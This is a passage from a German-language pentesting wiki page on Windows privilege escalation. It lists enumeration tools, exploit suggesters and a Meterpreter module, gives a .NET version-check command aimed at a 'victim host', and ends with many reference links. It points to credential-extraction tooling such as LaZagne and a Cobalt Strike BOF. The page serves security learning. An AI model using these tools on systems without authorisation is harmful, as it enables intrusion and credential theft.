[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriert den Host und sucht nach Fehlkonfigurationen (mehr ein Info-Gathering-Tool als privesc) (muss kompiliert werden) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Credentials aus vielen Programmen (precompiled exe im Github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (Executable precompiled im Github). Nicht empfohlen. Funktioniert nicht gut unter Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (exe aus python). Nicht empfohlen. Funktioniert nicht gut unter Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool basierend auf diesem Beitrag (benötigt accesschk nicht, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokal python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokal python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Sie müssen das Projekt mit der korrekten Version von .NET kompilieren ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Opferhost zu sehen, können Sie:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referenzen

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) und kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Auf der Jagd nach dem Silver Fox: Katz und Maus in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privilegierte Dateisystem-Schwachstelle in einem SCADA-System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Missbrauch von Symbolic Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
